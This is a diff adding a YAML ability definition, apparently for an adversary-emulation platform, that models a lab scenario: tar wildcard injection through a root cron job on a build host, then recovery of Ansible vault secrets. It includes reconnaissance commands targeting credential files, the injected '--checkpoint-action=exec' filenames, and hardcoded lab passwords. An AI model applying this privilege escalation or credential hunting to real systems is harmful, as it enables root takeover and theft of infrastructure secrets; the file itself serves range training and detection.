@@ -1,0 +1,83 @@
+- name: 'Scenario 3 - Pipeline Breach: Tar Wildcard Injection Privilege Escalation and Ansible Vault Decryption (LNXBUILDER)'
+  description: >-
+    Models privilege escalation on LNXBUILDER following SSH access to a deployment
+    account with write permissions in the build workspace. The target system runs a
+    root-owned archival job over attacker-controllable files, creating an
+    opportunity for wildcard-based argument injection into tar and subsequent code
+    execution as root. Once elevated, the operator is positioned to inspect the
+    local automation stack and recover orchestration secrets used to manage Windows
+    infrastructure. Defenders would expect relevant evidence in SSH logs, cron
+    execution, unexpected file naming patterns in the build directory, and follow-on
+    access to Ansible-related material.
+  tactic: privilege-escalation
+  technique_id: T1053.003
+  technique_name: 'Scheduled Task/Job: Cron'
+  singleton: false
+  repeatable: false
+  delete_payload: false
+  executors:
+  - name: sh
+    platform: linux
+    command: |-
+      echo "[*] Host context: $(hostname -f 2>/dev/null || hostname)"
+      echo
+      echo "[*] deploy_user identity:"
+      id deploy_user 2>/dev/null
+      echo
+      echo "[*] Writable build area metadata:"
+      ls -ld /opt/builds 2>/dev/null
+      find /opt/builds -maxdepth 2 -type f 2>/dev/null | sort | head -n 25
+      echo
+      echo "[*] Backup cron/job definition:"
+      sed -n '1,80p' /etc/cron.d/build-backup 2>/dev/null
+      sed -n '1,80p' /opt/backup-builds.sh 2>/dev/null
+      echo
+      echo "[*] Ansible automation footprint:"
+      find /opt/ansible -maxdepth 3 -type f \( -name ".vault_pass" -o -name "windows_creds.yml" -o -name "update-windows.yml" -o -name "hosts" \) \
+        -exec ls -l {} \; 2>/dev/null | sort
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 300
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info:
+      target_host: LNXBUILDER.cyberange.local
+      target_ip_suffix: .30
+      domain: cyberange.local
+      initial_access:
+        method: SSH
+        port: 22
+        username: deploy_user
+        password: 'D3pl0y#2025!'
+      writable_directory: /opt/builds
+      writable_by: builders group (deploy_user is member)
+      vulnerable_cron_job:
+        file: /etc/cron.d/build-backup
+        schedule: '*/2 * * * *'
+        runs_as: root
+        command: 'cd /opt/builds && tar czf /var/backups/builds-$(date +%Y%m%d).tar.gz *'
+        vulnerability: tar wildcard expansion interprets filenames as flags
+      wildcard_exploit_files:
+        - '--checkpoint=1'
+        - '--checkpoint-action=exec=sh privesc.sh'
+        - 'privesc.sh (payload script — e.g. add SUID bash or write SSH key)'
+      post_exploitation:
+        ansible_dir: /opt/ansible
+        vault_password_file: /opt/ansible/.vault_pass
+        vault_password: 'V@ultP@ss2025!'
+        encrypted_vault: /opt/ansible/group_vars/windows_creds.yml
+        vault_contents:
+          win_admin_user: ansible_svc
+          win_admin_password: 'Ans1bl3#Mgmt2025!'
+          win_domain: cyberange.local
+          win_mgmt_host: MGMT.cyberange.local
+      detection_events:
+        - '/var/log/auth.log - SSH login for deploy_user from attacker IP'
+        - 'Cron log - unusual process tree: cron -> tar -> sh -> privesc.sh'
+        - 'Filesystem events - creation of --checkpoint* files in /opt/builds'
+  requirements: []
+  id: f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7
